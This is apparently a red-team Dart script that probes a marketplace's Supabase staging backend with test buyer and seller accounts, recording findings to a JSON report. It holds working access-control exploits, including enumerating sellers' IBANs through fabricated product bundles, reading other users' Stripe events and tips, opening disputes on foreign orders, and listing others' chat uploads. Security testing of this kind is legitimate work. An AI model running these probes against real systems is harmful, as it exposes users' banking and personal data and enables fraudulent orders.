/// Pass 2 — classes adjacentes ao P1 banking + saturação extra.
import 'dart:convert';
import 'dart:io';
import 'dart:math';

const base = 'https://fxdknzrqjenzqcvnwqqq.supabase.co';

late String anon, svc, buyerJwt, sellerJwt, buyerId, sellerId;

Map<String, String> hdr(String token) => {
      'apikey': token == svc ? svc : anon,
      'Authorization': 'Bearer $token',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Future<Map<String, dynamic>> httpJson(
  String method,
  String url, {
  required String token,
  Object? body,
}) async {
  final c = HttpClient();
  final r = await c.openUrl(method, Uri.parse(url));
  hdr(token).forEach(r.headers.set);
  if (body != null) r.write(jsonEncode(body));
  final res = await r.close();
  final t = await res.transform(utf8.decoder).join();
  dynamic parsed;
  try {
    parsed = t.isEmpty ? null : jsonDecode(t);
  } catch (_) {
    parsed = t;
  }
  return {'_status': res.statusCode, '_body': parsed, '_text': t};
}

Future<Map<String, dynamic>> rest(
  String method,
  String path, {
  required String token,
  Object? body,
}) =>
    httpJson(method, '$base/rest/v1/$path', token: token, body: body);

Future<Map<String, dynamic>> rpc(
  String name,
  Map<String, dynamic> args, {
  required String token,
}) =>
    httpJson('POST', '$base/rest/v1/rpc/$name', token: token, body: args);

Future<String> signIn(String email, String password) async {
  final m = await httpJson(
    'POST',
    '$base/auth/v1/token?grant_type=password',
    token: anon,
    body: {'email': email, 'password': password},
  );
  return (m['_body'] as Map)['access_token'] as String;
}

final findings = <Map<String, dynamic>>[];
final evidence = <Map<String, dynamic>>[];

void rec(String id, String title, String sev, String impact, Map proof) {
  findings.add({
    'id': id,
    'title': title,
    'severity': sev,
    'impact': impact,
    'proof': proof,
  });
}

Future<void> main() async {
  final env = <String, String>{};
  for (final line in await File('tool/live_ops_staging.env').readAsLines()) {
    final t = line.trim();
    if (t.isEmpty || t.startsWith('#') || !t.contains('=')) continue;
    final i = t.indexOf('=');
    env[t.substring(0, i)] = t.substring(i + 1);
  }
  anon = env['SUPABASE_ANON_KEY']!;
  svc = env['SUPABASE_SERVICE_ROLE_KEY']!;
  buyerJwt = await signIn(
    env['LIVE_OPS_TEST_BUYER_EMAIL']!,
    env['LIVE_OPS_TEST_BUYER_PASSWORD']!,
  );
  sellerJwt = await signIn(
    env['LIVE_OPS_TEST_SELLER_EMAIL']!,
    env['LIVE_OPS_TEST_SELLER_PASSWORD']!,
  );
  buyerId = (await httpJson('GET', '$base/auth/v1/user', token: buyerJwt))['_body']
      ['id'] as String;
  sellerId = (await httpJson('GET', '$base/auth/v1/user', token: sellerJwt))['_body']
      ['id'] as String;

  // 1) Converted reservation status after buyer INSERT
  final conv = await rest(
    'GET',
    'live_reservation_requests?id=eq.a6d887d2-c3df-4763-9bdd-97cf9f42c1a1&select=id,status,requested_qty,buyer_id',
    token: svc,
  );
  evidence.add({'converted_row': conv});
  if (conv['_body'] is List && (conv['_body'] as List).isNotEmpty) {
    final st = ((conv['_body'] as List).first as Map)['status'];
    if (st == 'converted' || st == 'accepted') {
      rec(
        'RTB-P1-BUYER-CONVERTED',
        'Buyer INSERT reserva em estado consumidor (converted/accepted)',
        'P1',
        'Capacidade live consumida sem seller/pagamento.',
        {'row': conv['_body']},
      );
    }
  }

  // 2) Hybrid payment string final status
  final plat = await rest(
    'GET',
    'orders?id=eq.68dbd075-d087-4200-ae28-9a6323ca6ebd&select=id,status,payment_method,stock_units_applied,amount_paid_cents',
    token: svc,
  );
  evidence.add({'hybrid_pm_order': plat});
  if (plat['_body'] is List && (plat['_body'] as List).isNotEmpty) {
    final row = (plat['_body'] as List).first as Map;
    if (row['status'] == 'pago' &&
        (row['amount_paid_cents'] == null || row['amount_paid_cents'] == 0)) {
      rec(
        'RTB-P1-HYBRID-PM-PAGO',
        'Seller marca pago em método híbrido/plataforma sem captura',
        'P1',
        'Stock pode ser consumido sem Stripe em string de pagamento não-allowlist.',
        {'row': row},
      );
    }
  }

  // 3) stripe_checkout_events cross-user
  final ev = await rest(
    'GET',
    'stripe_checkout_events?buyer_id=neq.$buyerId&select=id,buyer_id,order_id,session_id,event&limit=5',
    token: buyerJwt,
  );
  evidence.add({'stripe_events_cross': ev});
  if (ev['_body'] is List && (ev['_body'] as List).isNotEmpty) {
    rec(
      'RTB-P1-STRIPE-EVENTS',
      'Buyer lê stripe_checkout_events de outros buyers',
      'P1',
      'Session IDs / order IDs de terceiros.',
      {'n': (ev['_body'] as List).length, 'sample': ev['_body']},
    );
  }

  // 4) raffle winners insert
  final rw = await rest('POST', 'live_raffle_winners', token: buyerJwt, body: {
    'raffle_id': '2e71ebba-3f7b-420f-a5fb-bea2e4fc59a4',
    'user_id': buyerId,
    'rank': 99,
  });
  evidence.add({'raffle_winner_insert': rw});

  // 5) SMS body
  final sms = await httpJson(
    'POST',
    '$base/functions/v1/send-sms-bulkgate',
    token: anon,
    body: {'phone': '+351910000000', 'otp': '000000'},
  );
  evidence.add({'sms': sms});

  // 6) Directory enumerate + bundle IBAN of existing sellers (amplify P1)
  final dir = await rest(
    'GET',
    'profiles_directory_public?user_type=eq.vendedor&select=id,full_name&limit=8',
    token: buyerJwt,
  );
  final ibans = <Map<String, dynamic>>[];
  if (dir['_body'] is List) {
    for (final p in dir['_body'] as List) {
      final sid = (p as Map)['id']?.toString();
      if (sid == null || sid == buyerId) continue;
      await rest('POST', 'product_bundles', token: buyerJwt, body: {
        'seller_id': sid,
        'buyer_id': buyerId,
        'product_ids': ['00000000-0000-0000-0000-000000000001'],
        'subtotal_eur': 1,
        'discount_pct': 0,
        'discount_eur': 0,
        'total_eur': 1,
        'status': 'pending',
      });
      final det = await rpc(
        'batata_seller_direct_payment_details',
        {'p_seller_id': sid},
        token: buyerJwt,
      );
      final body = det['_body'];
      if (body is List && body.isNotEmpty) {
        ibans.add({'seller_id': sid, 'details': body});
      }
    }
  }
  evidence.add({'iban_enum': {'n': ibans.length, 'hits': ibans}});
  if (ibans.length >= 2) {
    rec(
      'RTB-P1-BANKING-ENUM',
      'Enumeração: vários vendedores IBAN via bundle fabricado',
      'P1',
      'A classe banking oracle escala a todos os vendedores com pagamentos externos.',
      {'n_hits': ibans.length},
    );
  }

  // 7) live_tips of others
  final tips = await rest(
    'GET',
    'live_tips?buyer_id=neq.$buyerId&select=id,buyer_id,seller_id,amount,status&limit=5',
    token: buyerJwt,
  );
  evidence.add({'tips_cross': tips});

  // 8) disputes insert on foreign order
  final fo = await rest(
    'GET',
    'orders?buyer_id=neq.$buyerId&seller_id=neq.$buyerId&select=id&limit=1',
    token: svc,
  );
  if (fo['_body'] is List && (fo['_body'] as List).isNotEmpty) {
    final oid = ((fo['_body'] as List).first as Map)['id'];
    final d = await rest('POST', 'order_disputes', token: buyerJwt, body: {
      'order_id': oid,
      'buyer_id': buyerId,
      'reason': 'outro',
      'description': 'rtb',
    });
    evidence.add({'dispute_foreign': d});
    if (d['_status'] == 201 || d['_status'] == 200) {
      rec(
        'RTB-P1-DISPUTE-FOREIGN',
        'Buyer abre disputa em order alheia',
        'P1',
        'Autoridade: disputa sobre encomenda que não lhe pertence.',
        {'order_id': oid, 'status': d['_status']},
      );
    }
  }

  // 9) Storage list other user chat_uploads
  final st = await httpJson(
    'POST',
    '$base/storage/v1/object/list/chat_media',
    token: buyerJwt,
    body: {'prefix': 'chat_uploads/', 'limit': 20},
  );
  evidence.add({'storage_chat_uploads': st});

  // 10) Converted + marketplace oversell
  final tag = DateTime.now().millisecondsSinceEpoch.toString();
  final prod = await rest('POST', 'products', token: sellerJwt, body: {
    'seller_id': sellerId,
    'title': 'RTB conv-mkt $tag',
    'price': 4.0,
    'quantity': 1,
    'ref_code': 'RTB-CM-$tag',
    'list_on_marketplace': true,
    'is_sold': false,
  });
  String? pid;
  if (prod['_body'] is List && (prod['_body'] as List).isNotEmpty) {
    pid = ((prod['_body'] as List).first as Map)['id']?.toString();
  }
  final lives = await rest(
    'GET',
    'lives?seller_id=eq.$sellerId&select=id&limit=1',
    token: sellerJwt,
  );
  String? liveId;
  if (lives['_body'] is List && (lives['_body'] as List).isNotEmpty) {
    liveId = ((lives['_body'] as List).first as Map)['id']?.toString();
  }
  if (pid != null && liveId != null) {
    final li = await rest('POST', 'live_items', token: sellerJwt, body: {
      'live_id': liveId,
      'product_id': pid,
      'title': 'RTB cm $tag',
      'price': 4.0,
      'quantity': 1,
      'item_kind': 'marketplace_product',
      'status': 'available',
    });
    String? liid;
    if (li['_body'] is List && (li['_body'] as List).isNotEmpty) {
      liid = ((li['_body'] as List).first as Map)['id']?.toString();
    }
    Map<String, dynamic>? acc;
    if (liid != null) {
      acc = await rest('POST', 'live_reservation_requests', token: sellerJwt, body: {
        'live_id': liveId,
        'live_item_id': liid,
        'seller_id': sellerId,
        'buyer_id': buyerId,
        'requested_qty': 1,
        'status': 'accepted',
        'source': 'fleaber_live',
      });
    }
    final oMkt = await rest('POST', 'orders', token: sellerJwt, body: {
      'buyer_id': sellerId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
      'price_total': 4,
      'quantity': 1,
    });
    String? oidM;
    if (oMkt['_body'] is List && (oMkt['_body'] as List).isNotEmpty) {
      oidM = ((oMkt['_body'] as List).first as Map)['id']?.toString();
    }
    Map<String, dynamic>? pago;
    if (oidM != null) {
      pago = await rest('PATCH', 'orders?id=eq.$oidM', token: sellerJwt, body: {
        'status': 'pago',
      });
    }
    final afterP = await rest(
      'GET',
      'products?id=eq.$pid&select=quantity,is_sold',
      token: svc,
    );
    final afterR = liid == null
        ? null
        : await rest(
            'GET',
            'live_reservation_requests?live_item_id=eq.$liid&select=id,status,requested_qty',
            token: svc,
          );
    evidence.add({
      'converted_plus_mkt': {
        'live_item': li['_status'],
        'accept': acc?['_status'],
        'accept_text': (acc?['_text'] ?? '').toString().substring(
              0,
              min(200, (acc?['_text'] ?? '').toString().length),
            ),
        'mkt_order': oMkt['_status'],
        'pago': pago?['_status'],
        'pago_text': (pago?['_text'] ?? '').toString().substring(
              0,
              min(220, (pago?['_text'] ?? '').toString().length),
            ),
        'product': afterP['_body'],
        'reservations': afterR?['_body'],
      }
    });
    int consuming = 0;
    if (afterR?['_body'] is List) {
      for (final r in afterR!['_body'] as List) {
        final s = (r as Map)['status']?.toString();
        if (s == 'accepted' || s == 'converted') consuming++;
      }
    }
    int qty = -1;
    if (afterP['_body'] is List && (afterP['_body'] as List).isNotEmpty) {
      qty = (((afterP['_body'] as List).first as Map)['quantity'] as num?)
              ?.toInt() ??
          -1;
    }
    final mktPaid = pago?['_status'] == 200;
    if (consuming >= 1 && mktPaid && qty == 0) {
      rec(
        'RTB-P1-CAPACITY-PLUS-SALE',
        'Reserva accepted + venda MB WAY no mesmo SKU stock=1',
        'P1',
        'Capacidade live e venda marketplace coexistentes sobre 1 unidade.',
        {
          'consuming_reservations': consuming,
          'qty': qty,
          'reservations': afterR?['_body'],
        },
      );
    }
  }

  // 11) reviews of others (already public policy)
  final revs = await rest(
    'GET',
    'reviews?buyer_id=neq.$buyerId&select=id,order_id,comment,stars,buyer_id&limit=3',
    token: buyerJwt,
  );
  evidence.add({'reviews_others': {'status': revs['_status']}});

  // 12) connect-account confused deputy already 400. Phone via profiles own.
  final phoneCols = await rest(
    'GET',
    'profiles?id=eq.$sellerId&select=id,phone,iban,mb_way',
    token: buyerJwt,
  );
  evidence.add({'seller_profile_as_buyer': phoneCols});

  await File('REDTEAM_BLIND_B_20260829_1012_pass2.json').writeAsString(
    const JsonEncoder.withIndent('  ').convert({
      'findings': findings,
      'evidence': evidence,
    }),
  );
  stdout.writeln('pass2 findings=${findings.length} ${jsonEncode(findings.map((e) => e['id']).toList())}');
}
